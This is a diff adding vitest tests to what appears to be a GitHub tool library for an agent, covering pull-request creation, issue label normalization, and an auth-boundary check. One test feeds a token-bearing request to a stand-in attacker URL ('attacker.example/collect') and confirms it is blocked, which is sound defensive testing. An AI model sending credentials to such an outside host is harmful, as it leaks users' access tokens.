@@ -1,9 +1,11 @@
 import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
 import {
   setAuthResolver,
+  githubFetch,
   truncate,
   decodeContentsBlob,
   githubCreatePullTool,
+  githubGetIssueTool,
   githubMergePullTool,
   githubCreateReviewTool,
 } from "../src/index";
@@ -34,6 +36,14 @@ beforeEach(() => {
 
 afterEach(() => {
   vi.unstubAllGlobals();
+});
+
+describe("GitHub auth boundary", () => {
+  it("rejects external absolute URLs before sending the token", async () => {
+    const result = await githubFetch({ token: "test-pat" }, "https://attacker.example/collect") as { error?: string };
+    expect(result.error).toMatch(/api.github.com/);
+    expect(calls).toHaveLength(0);
+  });
 });
 
 describe("truncate", () => {
@@ -104,6 +114,27 @@ describe("github_create_pull", () => {
     });
   });
 
+  it("sends head_repo for a same-organization cross-repository pull request", async () => {
+    nextResponse = {
+      status: 201,
+      body: { number: 43, html_url: "https://github.com/o/r/pull/43", draft: false },
+    };
+    await githubCreatePullTool.invoke({
+      owner: "org",
+      repo: "destination",
+      title: "cross-repo change",
+      head: "feature/update",
+      head_repo: "source",
+      base: "main",
+    });
+    expect(JSON.parse(calls[0].init.body as string)).toEqual({
+      title: "cross-repo change",
+      head: "feature/update",
+      head_repo: "source",
+      base: "main",
+    });
+  });
+
   it("propagates GitHub error envelopes", async () => {
     nextResponse = { status: 422, body: { message: "no diff" } };
     const out = await githubCreatePullTool.invoke({
@@ -111,6 +142,21 @@ describe("github_create_pull", () => {
     });
     const parsed = JSON.parse(out) as { error?: string };
     expect(parsed.error).toContain("422");
+  });
+});
+
+describe("github_get_issue response normalization", () => {
+  it("preserves documented string and object label forms", async () => {
+    nextResponse = {
+      status: 200,
+      body: {
+        number: 7,
+        labels: ["bug", { name: "triaged" }],
+        user: { login: "octocat" },
+      },
+    };
+    const result = JSON.parse(await githubGetIssueTool.invoke({ owner: "o", repo: "r", number: 7 }));
+    expect(result.labels).toEqual(["bug", "triaged"]);
   });
 });
 
